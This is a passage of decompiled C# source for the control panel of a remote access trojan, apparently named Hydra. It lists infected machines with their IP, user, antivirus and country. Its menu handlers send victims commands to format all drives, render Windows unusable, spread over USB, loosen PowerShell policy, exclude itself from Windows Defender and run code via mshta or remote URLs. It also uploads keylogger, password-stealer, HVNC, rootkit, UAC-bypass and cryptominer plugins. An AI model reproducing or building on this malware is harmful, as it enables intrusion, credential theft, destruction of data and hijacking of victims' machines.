		private async void sharpChromiumToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.DoLoadGui(HYDRAUI.reupload("PONXk~Kzz$Zf\u007fmcdy$Xoge~oE~box$aos"), HYDRAUI.reupload("_zfekncdm*Q\\odeg*Zf\u007fmcdW*gen\u007ffo&*zfokyo*}kc~$$$"));
			try
			{
				Thread.Sleep(3000);
				try
				{
					this.guna2ContextMenuStrip1.Visible = false;
					if (this.GetSelectedSession(out var tcs))
					{
						tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Chromium"));
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		private async void webHistoryAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.GetSelectedSession(out var tcs))
				{
					tcs.Client_Send(DataType.RemoteHydraSTType, Encoding.UTF8.GetBytes("STrun"));
				}
			}
			catch
			{
			}
		}

		private async void getLogsLinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					if (this.GetSelectedSession(out var tcs))
					{
						tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("STLink"));
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		private async void formatAllDrivesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Format"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void netFrameworksAdminToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("InstNet"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void uSBSpreadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Spread"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void killerRegwindowsUnusableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("WindowsUnusable"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void sendEmailToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private async void unrestrictedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("Unrestricted"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void remoteSignedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("RemoteSigned"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void addNeonRatExcludeForWDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(() => this.LODAGUI("KillBill.key", "Initializing Task [KillBill] module, please wait..."));
			Task.Delay(4000).Wait();
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("AddEx"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void remoteURLExecutionToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.uploadOtherToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				TcpClientSession tcs;
				string address;
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						this.guna2ContextMenuStrip1.Visible = false;
						if (this.GetSelectedSession(out tcs))
						{
							address = tcs._remoteEndPoint.Address.ToString();
							if ((Remote_url)Application.OpenForms["Remote Url" + address] == null)
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									try
									{
										Application.Run(new Remote_url("\\\\" + address + " - [ Remote Url ]", tcs)
										{
											Name = "Remote Url" + address
										});
									}
									catch
									{
									}
								});
								thread.SetApartmentState(ApartmentState.STA);
								thread.Start();
							}
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private void getTheClipboardToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private async void startToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		private async void wordpadstartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.uploadOtherToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						this.guna2ContextMenuStrip1.Visible = false;
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("wordpad"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private async void injectMshtaexeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.uploadOtherToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						this.guna2ContextMenuStrip1.Visible = false;
						if (this.GetSelectedSession(out var tcs))
						{
							tcs.Client_Send(DataType.RemoteOtherType, Encoding.UTF8.GetBytes("mshta"));
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private void pluginRemoteSysInfoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("SystemInfo.Key", "Initializing Task [System] module, please wait...");
		}

		private void pluginRemoteStartupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Remote Startup.dll", "Initializing Task [Startup Manager] module, please wait...");
		}

		private void processPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Remote Process.dll", "Initializing Task [Process Management] module, please wait...");
		}

		private void pulginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Remote Shell.dll", "Initializing Task [Remote Terminal] module, please wait...");
		}

		private void pluginToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Remote File.dll", "Initializing Task [File Management] module, please wait...");
		}

		private void remoteDesktopPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Remote Desktop.dll", "Initializing Task [Remote Desktop] module, please wait...");
		}

		private void puginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Remote Keyboard.dll", "Initializing Task [Keylogger] module, please wait...");
		}

		private void escalationPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Remote PrivilegeEscalation.dll", "Initializing Task [Privilege Escalation] module, please wait...");
		}

		private void activateSTPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("ST.dll", "Initializing Task [Password Recovery] module, please wait...");
		}

		private void uploadPluginToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Remote File.dll", "Initializing Task [File Management] module, please wait...");
		}

		private void uploadPluginToolStripMenuItem5_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("RemotehVNC.key", "Initializing Task [HVNC] module, please wait...");
		}

		private void activateHRDPPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("HydraHRDPPlugin.key", "Initializing Task [RDP] module, please wait...");
		}

		private void activateOtherPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Other.key", "Initializing Task [Remote Other] module, please wait...");
		}

		private void activateUACPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("UACPlugin.key", "Initializing Task [Uac] module, please wait...");
		}

		private void activateMinerPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("HydraMinerPlugin.key", "Initializing Task [Miner] module, please wait...");
		}

		private void uploadOtherToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("Other.key", "Initializing Task [Hydra] module, please wait...");
		}

		private void activateRootKitPluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("HydraRooKit.key", "Initializing Task [RooKit] module, please wait...");
		}

		private void UploadpluginToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("port.Key", "Initializing Task [Remote Port] module, please wait...");
		}

		private void TcpToGui_Click(object sender, EventArgs e)
		{
			this.UploadPlugin("KillBill.key", "Initializing Task [KillBill] module, please wait...");
		}

		private void SysInfo_click(object sender, EventArgs e)
		{
			this.UploadPlugin("SystemInfo.Key", "Initializing Task [SystemInfo] module, please wait...");
		}

		public void ClientConnected(object sender, EventArgs m)
		{
			try
			{
				ListViewItem lvi = new ListViewItem();
				TcpClientSession tcpClientSession = (TcpClientSession)sender;
				tcpClientSession._cif._FormExecute = new Action<TcpClientSession, GetCilentInfo>(UpdateClientInfo);
				lvi.Name = tcpClientSession._sessionKey;
				lvi.Text = tcpClientSession._remoteEndPoint.Address.ToString();
				this.ClientMessage(lvi.Text + "  ....Online！！！", null);
				base.Invoke((MethodInvoker)delegate
				{
					lock (this._lockclientlist)
					{
						this.listView1.Items.Add(lvi);
						((Control)(object)this.lblOnline).Text = "Online:[ " + this._tcpServer._sessions.Count + " ]";
					}
				});
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message + "ClientConnected");
			}
		}

		public void ClientDisconnected(object sender, EventArgs m)
		{
			try
			{
				TcpClientSession _s = (TcpClientSession)sender;
				this.ClientMessage(_s._remoteEndPoint.Address.ToString() + "  ....Offline！！！", null);
				base.Invoke((MethodInvoker)delegate
				{
					lock (this._lockclientlist)
					{
						foreach (ListViewItem item in this.listView1.Items)
						{
							if (item.SubItems[0].Name.Equals(_s._sessionKey))
							{
								this.listView1.Items.Remove(item);
							}
							((Control)(object)this.lblOnline).Text = "Online:[ " + this._tcpServer._sessions.Count + " ]";
						}
					}
				});
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message + "ClientDisconnected");
			}
		}

		private void AddClientToListview(Client client)
		{
			if (client == null)
			{
				return;
			}
			try
			{
				ListViewItem lvi = new ListViewItem(new string[9]
				{
					" " + client.EndPoint.Address,
					client.Value.UserAtPc,
					client.Value.OperatingSystem,
					"Connected",
					client.Value.Tag,
					"Active",
					client.Value.AccountType,
					client.Value.Version,
					client.Value.CountryWithCode
				})
				{
					Tag = client,
					ImageIndex = client.Value.ImageIndex
				};
				base.Invoke((MethodInvoker)delegate
				{
					lock (this._lockClients)
					{
						this.listView1.Items.Add(lvi);
					}
				});
			}
			catch (InvalidOperationException)
			{
			}
		}

		private void RemoveClientFromListview(Client client)
		{
			if (client == null)
			{
				return;
			}
			try
			{
				base.Invoke((MethodInvoker)delegate
				{
					lock (this._lockClients)
					{
						using IEnumerator<ListViewItem> enumerator = (from ListViewItem lvi in this.listView1.Items
							where lvi != null && client.Equals(lvi.Tag)
							select lvi).GetEnumerator();
						if (enumerator.MoveNext())
						{
							enumerator.Current.Remove();
						}
					}
				});
			}
			catch (InvalidOperationException)
			{
			}
		}

		public void ClientMessage(object sender, EventArgs m)
		{
			try
			{
				ListViewItem lvi = new ListViewItem();
				lvi.Text = "[ * ]  " + DateTime.Now.ToString();
				lvi.SubItems.Add((string)sender);
				base.Invoke((MethodInvoker)delegate
				{
					lock (this._Messobjlock)
					{
						this.listView2.Items.Add(lvi);
						this.listView2.Items[this.listView2.Items.Count - 1].EnsureVisible();
					}
				});
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message + "ClientMessage");
			}
		}

		public void UpdateClientInfo(TcpClientSession tcs, GetCilentInfo gci)
		{
			try
			{
				base.Invoke((MethodInvoker)delegate
				{
					lock (this._lockclientlist)
					{
						this.listView1.BeginUpdate();
						foreach (ListViewItem item in this.listView1.Items)
						{
							if (item.SubItems[0].Name.Equals(tcs._sessionKey))
							{
								item.SubItems.AddRange(new string[8] { gci._MachineName, gci._OperatingSystem, gci._StatrTime, gci._Install, gci._Privileges, gci._Anti_virus, gci._net, gci._Country });
							}
						}
						this.listView1.EndUpdate();
					}
				});
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message + "UpdateClientInfo");
			}
		}

		private bool GetSelectedSession(out TcpClientSession tcs)
		{
			TcpClientSession value = null;
			if (this.listView1.SelectedItems.Count == 0)
			{
				tcs = null;
				return false;
			}
			if (this._tcpServer._sessions.TryGetValue(this.listView1.SelectedItems[0].Name, out value))
			{
				tcs = value;
				return true;
			}
			tcs = null;
			return false;
		}

		private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				if (base.WindowState == FormWindowState.Normal)
				{
					base.WindowState = FormWindowState.Minimized;
					base.Hide();
				}
				else if (base.WindowState == FormWindowState.Minimized)
				{
					base.Show();
					base.WindowState = FormWindowState.Normal;
					base.Activate();
				}
			}
		}

		private ListView createNewTabPage()
		{
			ColumnHeader columnHeader = new ColumnHeader();
			ColumnHeader columnHeader2 = new ColumnHeader();
			ColumnHeader columnHeader3 = new ColumnHeader();
			ColumnHeader columnHeader4 = new ColumnHeader();
			ColumnHeader columnHeader5 = new ColumnHeader();
			ColumnHeader columnHeader6 = new ColumnHeader();
			ColumnHeader columnHeader7 = new ColumnHeader();
			ColumnHeader columnHeader8 = new ColumnHeader();
			ColumnHeader columnHeader9 = new ColumnHeader();
			ColumnHeader columnHeader10 = new ColumnHeader();
			ListView listView = new ListView();
			listView.BackColor = Color.FromArgb(226, 28, 71);
			listView.BorderStyle = BorderStyle.None;
			listView.Columns.AddRange(new ColumnHeader[10] { columnHeader, columnHeader2, columnHeader3, columnHeader4, columnHeader5, columnHeader6, columnHeader7, columnHeader8, columnHeader9, columnHeader10 });
			columnHeader.Text = "IP Address";
			columnHeader.Width = 100;
			columnHeader2.Text = "Computer/Username";
			columnHeader2.Width = 160;
			columnHeader3.Text = "Computer/Remarks";
			columnHeader3.Width = 120;
			columnHeader4.Text = "Operating System";
			columnHeader4.Width = 200;
			columnHeader5.Text = "Startup Time";
			columnHeader5.Width = 150;
			columnHeader6.Text = "Install Time";
			columnHeader6.Width = 150;
			columnHeader7.Text = "Authority";
			columnHeader7.Width = 80;
			columnHeader8.Text = "Anti-Virus";
			columnHeader8.Width = 200;
			columnHeader9.Text = ".Net Version";
			columnHeader9.Width = 80;
			columnHeader10.Text = "Region/Country";
			columnHeader10.Width = 200;
			listView.ContextMenuStrip = this.createContextMenu();
			listView.Font = new Font("Century Gothic", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 134);
			listView.ForeColor = Color.FromArgb(190, 190, 190);
			listView.FullRowSelect = true;
			listView.HideSelection = false;
			listView.Location = new Point(2, 2);
			listView.MultiSelect = false;
			listView.Name = "lvClientInfo";
			listView.OwnerDraw = true;
			listView.Size = new Size(1265, 380);
			listView.BorderStyle = BorderStyle.FixedSingle;
			listView.TabIndex = 0;
			listView.UseCompatibleStateImageBehavior = false;
			listView.View = View.Details;
			listView.DrawColumnHeader += new DrawListViewColumnHeaderEventHandler(ListView1_DrawColumnHeader);
			listView.DrawItem += new DrawListViewItemEventHandler(ListView1_DrawItem);
			listView.DrawSubItem += new DrawListViewSubItemEventHandler(ListView1_DrawSubItem);
			return listView;
		}

		private ContextMenuStrip createContextMenu()
		{
			ContextMenuStrip contextMenuStrip = new ContextMenuStrip();
			ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem2 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem3 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem4 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem5 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem6 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem7 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem8 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem9 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem10 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem11 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem12 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem13 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem14 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem15 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem16 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem17 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem18 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem19 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem20 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem21 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem22 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem23 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem24 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem25 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem26 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem27 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem28 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem29 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem30 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem31 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem32 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem33 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem34 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem35 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem36 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem37 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem38 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem39 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem40 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem41 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem42 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem43 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem44 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem45 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem46 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem47 = new ToolStripMenuItem();
			ToolStripMenuItem toolStripMenuItem48 = new ToolStripMenuItem();
			contextMenuStrip.BackColor = Color.FromArgb(30, 30, 30);
			contextMenuStrip.Items.AddRange(new ToolStripItem[12]
			{
				toolStripMenuItem, toolStripMenuItem11, toolStripMenuItem17, toolStripMenuItem46, toolStripMenuItem20, toolStripMenuItem23, toolStripMenuItem26, toolStripMenuItem29, toolStripMenuItem32, toolStripMenuItem14,
				toolStripMenuItem35, toolStripMenuItem38
			});
			contextMenuStrip.Name = "contextMenuStrip1";
			contextMenuStrip.Size = new Size(181, 224);
			toolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[8] { toolStripMenuItem2, toolStripMenuItem3, toolStripMenuItem4, toolStripMenuItem6, toolStripMenuItem7, toolStripMenuItem8, toolStripMenuItem9, toolStripMenuItem10 });
			toolStripMenuItem.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem.Name = "toolSystemMessage";
			toolStripMenuItem.Size = new Size(180, 22);
			toolStripMenuItem.Text = "System Message";
			toolStripMenuItem2.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem2.Name = "clientInfoToolStripMenuItem1";
			toolStripMenuItem2.Size = new Size(144, 22);
			toolStripMenuItem2.Text = "Client Information";
			toolStripMenuItem2.Click += new EventHandler(GuiToUnnistall_Click);
			toolStripMenuItem3.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem3.Name = "disConnectToolStripMenuItem";
			toolStripMenuItem3.Size = new Size(144, 22);
			toolStripMenuItem3.Text = "Disconnect";
			toolStripMenuItem3.Click += new EventHandler(disconnectToolStripMenuItem_Click);
			toolStripMenuItem4.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem4.Name = "restartToolStripMenuItem";
			toolStripMenuItem4.Size = new Size(144, 22);
			toolStripMenuItem4.Text = "Restart Connection";
			toolStripMenuItem4.Click += new EventHandler(restartToolStripMenuItem_Click_1);
			toolStripMenuItem5.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem5.Name = "restartToolStripMenuItem";
			toolStripMenuItem5.Size = new Size(144, 22);
			toolStripMenuItem5.Text = "Web History";
			toolStripMenuItem5.Click += new EventHandler(webRecoveryToolStripMenuItem_Click);
			toolStripMenuItem6.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem6.Name = "远程关机ToolStripMenuItem";
			toolStripMenuItem6.Size = new Size(144, 22);
			toolStripMenuItem6.Text = "Remote Shutdown";
			toolStripMenuItem6.Click += new EventHandler(RemoteshutdownToolStripMenuItem_Click);
			toolStripMenuItem7.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem7.Name = "远程重启ToolStripMenuItem";
			toolStripMenuItem7.Size = new Size(144, 22);
			toolStripMenuItem7.Text = "Remote Restart";
			toolStripMenuItem7.Click += new EventHandler(RemoterestartToolStripMenuItem_Click);
			toolStripMenuItem8.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem8.Name = "远程注销ToolStripMenuItem";
			toolStripMenuItem8.Size = new Size(144, 22);
			toolStripMenuItem8.Text = "Remote Logout";
			toolStripMenuItem9.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem9.Name = "更新客户端ToolStripMenuItem";
			toolStripMenuItem9.Size = new Size(144, 22);
			toolStripMenuItem9.Text = "Update client";
			toolStripMenuItem10.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem10.Name = "uplugnToolStripMenuItem";
			toolStripMenuItem10.Size = new Size(144, 22);
			toolStripMenuItem10.Text = "Upload plugin";
			toolStripMenuItem10.Click += new EventHandler(TcpToGui_Click);
			toolStripMenuItem11.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem12, toolStripMenuItem13 });
			toolStripMenuItem11.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem11.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem11.Name = "remoteShellToolStripMenuItem";
			toolStripMenuItem11.Size = new Size(180, 22);
			toolStripMenuItem11.Text = "Remote Terminal";
			toolStripMenuItem12.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem12.Name = "remoteShellToolStripMenuItem1";
			toolStripMenuItem12.Size = new Size(130, 22);
			toolStripMenuItem12.Text = "Remote Terminal";
			toolStripMenuItem12.Click += new EventHandler(remoteShellToolStripMenuItem1_Click);
			toolStripMenuItem13.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem13.Name = "pulginToolStripMenuItem";
			toolStripMenuItem13.Size = new Size(130, 22);
			toolStripMenuItem13.Text = "Upload plugin";
			toolStripMenuItem13.Click += new EventHandler(pulginToolStripMenuItem_Click);
			toolStripMenuItem14.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem15, toolStripMenuItem16 });
			toolStripMenuItem14.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem14.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem14.Name = "remoteStartupToolStripMenuItem";
			toolStripMenuItem14.Size = new Size(180, 22);
			toolStripMenuItem14.Text = "Startup Manager";
			toolStripMenuItem15.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem15.Name = "remoteStartupToolStripMenuItem1";
			toolStripMenuItem15.Size = new Size(130, 22);
			toolStripMenuItem15.Text = "Startup Manager";
			toolStripMenuItem15.Click += new EventHandler(remoteStartupToolStripMenuItem_Click);
			toolStripMenuItem16.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem16.Name = "pulginToolStripMenuItem";
			toolStripMenuItem16.Size = new Size(130, 22);
			toolStripMenuItem16.Text = "Upload plugin";
			toolStripMenuItem16.Click += new EventHandler(pluginRemoteStartupToolStripMenuItem_Click);
			toolStripMenuItem17.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem18, toolStripMenuItem19 });
			toolStripMenuItem46.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem47, toolStripMenuItem48 });
			toolStripMenuItem17.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem17.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem17.Name = "remoteProcessToolStripMenuItem";
			toolStripMenuItem17.Size = new Size(180, 22);
			toolStripMenuItem17.Text = "Process Management";
			toolStripMenuItem18.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem18.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem18.Name = "remoteProcessToolStripMenuItem2";
			toolStripMenuItem18.Size = new Size(130, 22);
			toolStripMenuItem18.Text = "Process Management";
			toolStripMenuItem18.Click += new EventHandler(remoteProcessToolStripMenuItem2_Click);
			toolStripMenuItem46.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem46.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem46.Name = "modifyGroupToolStripMenuItem";
			toolStripMenuItem46.Size = new Size(180, 22);
			toolStripMenuItem46.Text = "Change Information";
			toolStripMenuItem46.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem47.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem47.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem47.Name = "modifyNoteToolStripMenuItem";
			toolStripMenuItem47.Size = new Size(130, 22);
			toolStripMenuItem47.Text = "Change Note";
			toolStripMenuItem47.Click += new EventHandler(modifyNoteToolStripMenuItem_Click);
			toolStripMenuItem48.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem48.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem48.Name = "modifyGroupToolStripMenuItem2";
			toolStripMenuItem48.Size = new Size(130, 22);
			toolStripMenuItem48.Text = "Change Group";
			toolStripMenuItem48.Click += new EventHandler(modifyGroupToolStripMenuItem2_Click);
			toolStripMenuItem19.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem19.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem19.Name = "processPluginToolStripMenuItem";
			toolStripMenuItem19.Size = new Size(130, 22);
			toolStripMenuItem19.Text = "Upload plugin";
			toolStripMenuItem19.Click += new EventHandler(processPluginToolStripMenuItem_Click);
			toolStripMenuItem20.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem21, toolStripMenuItem22 });
			toolStripMenuItem20.Font = new Font("Century Gothic", 10.5f);
